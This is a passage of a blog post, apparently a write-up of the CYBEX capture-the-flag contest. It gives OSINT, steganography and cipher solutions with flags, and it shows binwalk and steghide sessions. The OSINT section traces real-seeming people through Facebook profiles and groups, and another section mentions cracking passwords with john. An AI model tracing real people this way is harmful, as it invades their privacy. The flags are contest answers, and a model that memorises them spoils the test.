+<p><a href="https://es.wikipedia.org/wiki/Hospital_del_T%C3%B3rax_(Tarrasa)">https://es.wikipedia.org/wiki/Hospital_del_T%C3%B3rax_(Tarrasa)</a></p>
+<p>Flag: CYBEX{hospitaldeltorax}</p>
+<h3 id="ctfcatch-the-rebel">CTF{Catch The Rebel}<a href="#ctfcatch-the-rebel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Using Yandex&rsquo;s reverse search function, we get a similar image:</p>
+<p><img src="files/Yandex1.PNG" alt="Reverse image search"></p>
+<p>Which takes us to the following FourSquare page:</p>
+<p><img src="files/Yandex2.PNG" alt="FourSquare"></p>
+<p>Testing several of the nearby streets we get the correct one, roseavenue.</p>
+<p>Flag: CYBEX{roseavenue}</p>
+<h3 id="operación-retorno">Operación retorno<a href="#operación-retorno" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We are given a [SoundCloud profile] (<a href="https://soundcloud.com/moukeb_alahzan">https://soundcloud.com/moukeb_alahzan</a>)</p>
+<p><img src="files/Soundcloud.PNG" alt="SoundCloud"></p>
+<p>Searching in Google we get a match on Facebook, possible profile of the author:</p>
+<p><img src="files/Facebook1.PNG" alt="Facebook Profile"></p>
+<p>In the Facebook link post itself, we have two more people, one who likes</p>
+<p><img src="files/LedaLikeEnFB.PNG" alt="El que da like"></p>
+<p>And another one that leaves a comment</p>
+<p><img src="files/ComentaEnFacebook.PNG" alt="El que comenta"></p>
+<p>Not everyone has weapons in his profile picture, and he is in military attire, lets look for more.</p>
+<p>Thoroughly reviewing his profile we see a long text with possible interests of the subject.</p>
+<p><img src="files/MoreDelQueComenta.PNG" alt="More del que Comenta"></p>
+<p>Translating all his interests, the following excerpt draws our attention:</p>
+<p><img src="files/TraduciendoTodoElTextoFragmentoLlamaAtencion.PNG" alt="Traducción de un fragmento por Google Translate"></p>
+<p>Checking the link, we access a somewhat shady public Facebook group.</p>
+<p><img src="files/AccedemosFacebook2.PNG" alt="Grupo publico"></p>
+<p>Inside we can see an interesting comment that draws our attention for being a province of the target country.</p>
+<p><img src="files/ComentarioFacebookParte2.PNG" alt="ComentarioFacebookParte2"></p>
+<p>Translating the comment</p>
+<p><img src="files/TraducionComentarioFinal.PNG" alt="TraducionComentarioFinal"></p>
+<p>In Google Maps we can see its most important cities.</p>
+<p><img src="files/GoogleMaps.PNG" alt="GoogleMaps"></p>
+<p>Testing Nasiriya aaaand correct :D</p>
+<p>Flag: CYBEX{nasiriya}</p>
+<h2 id="esteganografía">Esteganografía<a href="#esteganografía" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="dónde-están-mis-llaves">¿Dónde están mis llaves?<a href="#dónde-están-mis-llaves" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Using the <code>stegcracker</code> tool on the provided image, we get the following message in Spanish:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="294738156" type="checkbox"  />
+    <label for="294738156">
+      <span class="collapsable-code__language">Bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Bash" ><code>
+cat Tesla.jpg.out 
+Parece que has perdido las llaves de tu nuevo coche... Ya te vale.
+
+Menos mal que al comprarlo podías poner una contraseña para que se abriera.
+
+Ahí va:
+
+CYBEX{Nm4p_y_p4_d3ntr0}
+
+La próxima vez ves con mas cuidado.
+</code></pre>
+  </div>
+
+
+<p>You know, &ldquo;nmap and go?&rdquo;.</p>
+<h3 id="beep-boop">Beep Boop<a href="#beep-boop" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The name and the challenge description give us a clue about the steganography program we have to use, DeepSound.</p>
+<p>Looking at the list of passwords, it can be seen that most of them are simple except one. Instead of guessing which one is correct, we could have used the <code>deep2john</code> tool and then crack it using<code> john</code> with the provided dictionary.</p>
+<p>Of the 7 extracted images extracted with DeepSound, number 7 has a hidden base64 czNjcjN0cDRzc3cwckQhKg == -&gt; s3cr3tp4ssw0rD! *</p>
+<p>Using <code>binwalk</code> we find and extract a zip, with the pw we extract the flag.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="629138754" type="checkbox"  />
+    <label for="629138754">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+poltatil@kali:~/CybexCTF/Stego$ binwalk --dd=&#39;.*&#39; image07.PNG 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 540 x 277, 8-bit colormap, non-interlaced
+1029          0x405           Zlib compressed data, best compression
+94181         0x16FE5         PNG image, 540 x 277, 8-bit colormap, non-interlaced
+95055         0x1734F         Zlib compressed data, best compression
+187948        0x2DE2C         Zip archive data, encrypted at least v1.0 to extract, compressed size: 33, uncompressed size: 21, name: flag.txt
+188141        0x2DEED         End of Zip archive, footer length: 22
+
+poltatil@kali:~/CybexCTF/Stego$ ls
+BeepBoop.zip   hellofriend.wav  image02.jpg  image04.PNG  image07.PNG             Tesla.jpg      weird.txt
+Documents.zip  image01.jpg      image03.PNG  image06.jpg  _image07.PNG.extracted  Tesla.jpg.out
+poltatil@kali:~/CybexCTF/Stego$ cd _image07.PNG.extracted/
+poltatil@kali:~/CybexCTF/Stego/_image07.PNG.extracted$ ls
+0  16FE5  1734F  1734F-0  2DE2C  2DEED  405  405-0
+poltatil@kali:~/CybexCTF/Stego/_image07.PNG.extracted$ files ./*
+bash: files: command not found
+poltatil@kali:~/CybexCTF/Stego/_image07.PNG.extracted$ file ./*
+./0:       PNG image data, 540 x 277, 8-bit colormap, non-interlaced
+./16FE5:   PNG image data, 540 x 277, 8-bit colormap, non-interlaced
+./1734F:   empty
+./1734F-0: zlib compressed data
+./2DE2C:   Zip archive data, at least v1.0 to extract
+./2DEED:   Zip archive data (empty)
+./405:     empty
+./405-0:   zlib compressed data
+poltatil@kali:~/CybexCTF/Stego/_image07.PNG.extracted$ unzip ./2DE2C
+Archive:  ./2DE2C
+[./2DE2C] flag.txt password: 
+ extracting: flag.txt                
+poltatil@kali:~/CybexCTF/Stego/_image07.PNG.extracted$ cat flag.txt 
+CYBEX{mR_R0b0T_FtW!}
+</code></pre>
+  </div>
+
+
+<p>Flag: CYBEX{mR_R0b0T_FtW!}</p>
+<h2 id="criptografía">Criptografía<a href="#criptografía" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="alfin-esta-en-la-base">Alfin esta en la base<a href="#alfin-esta-en-la-base" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The name of the challenge tells us everything we will need to solve it.</p>
+<p>Challenge text:
+
+
+
+  <div class="collapsable-code">
+    <input id="137658924" type="checkbox"  />
+    <label for="137658924">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+ubddprak: X1iHAMw7YlswY2MjV29jkWCwYTQ9
+</code></pre>
+  </div>
+
+</p>
+<p>Affine cypher: <a href="https://www.dcode.fr/affine-cipher">https://www.dcode.fr/affine-cipher</a></p>
+<p>Control + F of &ldquo;password&rdquo; in order to find the valid one, convert from base64 to ascii.</p>
+<p>Flag: <code>CYBEX{flagencontrada}</code></p>
+<h3 id="roma">Roma<a href="#roma" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Cesar cypher, try different rotations until you find the correct one.</p>
+<p>Flag: <code>CYBEX{al_cesar_lo_que_es_del_cesar}</code></p>
+<h3 id="potencial--intensidad">Potencial / Intensidad<a href="#potencial--intensidad" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Potencial / Intensidad = Resistencia :D</p>
+<p>In this challenge we have a txt consisting of upper and lower case letters (two different states) in columns of 8.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="798423165" type="checkbox"  />
+    <label for="798423165">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+aPoRelbo eOEeEcoM dINComoD nVIVaIgN TIUsNotE ueDesmoñ cONIamoc eSEnunnE eROviVAN oSPachaC osDimela aNDaNGui aELdineR toPeroqu hAPacHaD sONLasDO eYMEdIap sADasquE aNCInCom nUTOsDeE tREvistA ueGrANde arEjodan oELSOfAy uEPeRROE iGNAtiUs aVAJeaNd lODaVIDE alMiRANt alriGhTg isonYlAn eVejunTO oNrICarD vIvanlOs aChacHoS uRcIAnoe iSTEElDI eRItOLos acHAcHos uEpACHAC nLOSpaCh chOChaPO eLBOteEE ooEEeeeA oRELboTE eEOEeEee coMOdiIN oMOdINNc mODiiiIN omODinnV vaNLoSpa hAcHOCHV vAIgNAtI slOSpach cHOsBRon anIXlOsp cHACHOcH
+</code></pre>
+  </div>
+
+
+<p>The hint that the capitals are &ldquo;finer&rdquo; makes us suspect that they might be encoding binary information. Using the search and replace function of any text editor, with the following two regular expressions:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="816352749" type="checkbox"  />
+    <label for="816352749">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+&#34;[a-zñ]&#34; por 0
+&#34;[A-ZÑ]&#34; por 1
+</code></pre>
+  </div>
+
+
+<p>We obtain:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="361725984" type="checkbox"  />
+    <label for="361725984">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+01010000 01101001 01110001 01110101 11101001 00100001 01110000 01100001 01100111 01100001 00100000 01101100 01100001 00100000 01100101 01110011 01110100 01100001 01110100 01110101 01100001 00101100 00100000 01111010 01101111 01110010 01110010 01101111 00101110 00001010 00001010 01000011 01011001 01000010 01000101 01011000 01111011 01101100 00110100 01011111 01110010 00110011 01110011 00110001 01110011 01110100 00110011 01101110 01100011 00110001 00110100 01011111 01101101 00110000 01101100 00110100 01111101
+</code></pre>
+  </div>
+
+
+<p>Converting from binary to text we get the flag.</p>
+<p>Flag: <code>CYBEX{l4_r3s1st3nc14_m0l4}</code></p>
+<h3 id="una-copa">¿Una copa?<a href="#una-copa" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Solved after finishing the CTF, thanks to a hint from Oreos.</p>
+<p>The text is encrypted with the Fermat algorithm (hints: the file is called MyWine, it talks about drinks in the description &hellip;).</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="432768951" type="checkbox"  />
+    <label for="432768951">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+24u2gKKqq5qyngxNt1hYwPv70haH1WndybjAO982sfI=
+
+gAAAAABeSa9-bUDh_wGABM9fJRORU_FRPBIHpZcskNsieSRPiC37RXZBKJHtfQRKh7FgGwTaIrtNaSoHmWTO7s7Bc03o83NLEEfMrjlecjgrmZLFsSbka5t3CaNm--qrKiL0VlakyW1mAu9sCXx571BX63rOdNcpQyjJDAatTBmpPStFaUR3Lpv1RCtYxA-X6m_8uCfQ7v180xVCSoVtAeS40Ovs8sUp9uIZ0ReQgNu82i9kKOGHgZJAoS2yaDCUDfsWLZ6l-NOX
+
+</code></pre>
+  </div>
+
+
+<p>Since we have the key, we can decrypt it directly using <a href="https://asecuritysite.com/encryption/ferdecode">this tool</a>.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="832145679" type="checkbox"  />
+    <label for="832145679">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+Decoded:	NB2HI4DTHIXS6ZDSNF3GKLTHN5XWO3DFFZRW63JPMZUWYZJPMQXTCY2OKR4GO5TXO44DMM2QNNPUOY2SMF4WM2KGGJQWC53LKZVVM3KLF53GSZLXH52XG4B5ONUGC4TJNZTQU===
+Date created:	Sun Feb 16 21:09:18 2020
+Current time:	Wed Apr  8 00:31:10 2020
+
+======Analysis====
+Decoded data:  80000000005e49af7e6d40e1ff018004cf5f25139153f1513c1207a5972c90db2279244f882dfb4576412891ed7d044a87b1601b04da22bb4d692a079964ceeecec1734de8f3734b1047ccae395e72382b9992c5b126e46b9b7709a366fbeaab2a22f45656a4c96d6602ef6c097c79ef5057eb7ace74d7294328c90c06ad4c19a93d2b456944772e9bf5442b58c40f97ea6ffcb827d0eefd7cd315424a856d01e4b8d0ebecf2c529f6e219d1179080dbbcda2f6428e187819240a12db26830940dfb162d9ea5f8d397
+Version:	80
+Date created:	000000005e49af7e
+IV:		6d40e1ff018004cf5f25139153f1513c
+Cipher:		1207a5972c90db2279244f882dfb4576412891ed7d044a87b1601b04da22bb4d692a079964ceeecec1734de8f3734b1047ccae395e72382b9992c5b126e46b9b7709a366fbeaab2a22f45656a4c96d6602ef6c097c79ef5057eb7ace74d7294328c90c06ad4c19a93d2b456944772e9bf5442b58c40f97ea6ffcb827d0eefd7cd315424a856d01e4b8d0ebecf2c529f6
+HMAC:		e219d1179080dbbcda2f6428e187819240a12db26830940dfb162d9ea5f8d397
+
+======Converted====
+IV:		6d40e1ff018004cf5f25139153f1513c
+Time stamp:	1581887358
+Date created:	Sun Feb 16 21:09:18 2020
+
+</code></pre>
+  </div>
+
+
+<p>Converting the base32 to text we get an image hosted in <a href="https://drive.google.com/file/d/1cNTxgvww863Pk_GcRayfiF2aawkVkVmK/view?usp=sharing">Google Drive</a></p>
+<p>Using <code>steghide</code> without a password we get the flag:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="837694152" type="checkbox"  />
+    <label for="837694152">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+poltatil@kali:~/CybexCTF/Crypto$ steghide info SomeFermet.jpg 
+&#34;SomeFermet.jpg&#34;:
+  format: jpeg
+  capacity: 4.5 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file &#34;ImNotAFlag.txt&#34;:
+    size: 30.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+poltatil@kali:~/CybexCTF/Crypto$ steghide extract -sf SomeFermet.jpg 
+Enter passphrase: 
+wrote extracted data to &#34;ImNotAFlag.txt&#34;.
+poltatil@kali:~/CybexCTF/Crypto$ cat ImNotAFlag.txt 
+CIBEX{fernet_is_brainfucking}
+poltatil@kali:~/CybexCTF/Crypto$
+</code></pre>
+  </div>
+
+
+<p>Flag: CIBEX{fernet_is_brainfucking}</p>
+<h3 id="qorr">QorR<a href="#qorr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>File with <code>bmp</code> extension, but it cannot be opened with any viewer, and neither<code> file</code> nor <code>binwalk</code> can identify it.</p>
+<p>Checking the headers, they may have been modified. Considering that according to <a href="http://www.ece.ualberta.ca/~elliott/ee552/studentAppNotes/2003_w/misc/bmp_file_format/bmp_file_format.htm">the standard</a> the correct headers should start with <code>0x42 0x4D 0x42 0x6d 0x00 0x00</code>, XORing said bytes with the beginning of the file we obtain the XOR encryption key, which also appears repeated throughout the file.
+(If you encrypt 00000 -&gt; Key XOR 00000 = Key)</p>
+<p>XORing the whole image with the recovered key we obtain the following QR:</p>
+<p><img src="files/qr_decoded.bmp" alt="QR"></p>
+<p>Doing QRDecode in <a href="https://gchq.github.io/CyberChef/">Cyberchef</a> or <a href="https://zxing.org/w/decode.jspx">zxing</a> we get the flag: CYBEX{QRONAO}</p>
+<h2 id="conclusiones">Conclusiones<a href="#conclusiones" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Thanks to the organizers for making such a varied and interesting CTF, I would love to participate in future editions.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/posts/uam-julio/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Una Al Mes - Julio 2020</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/posts/obscure-writeup/">
+                <span class="button__text">Obscurity HTB WriteUp</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
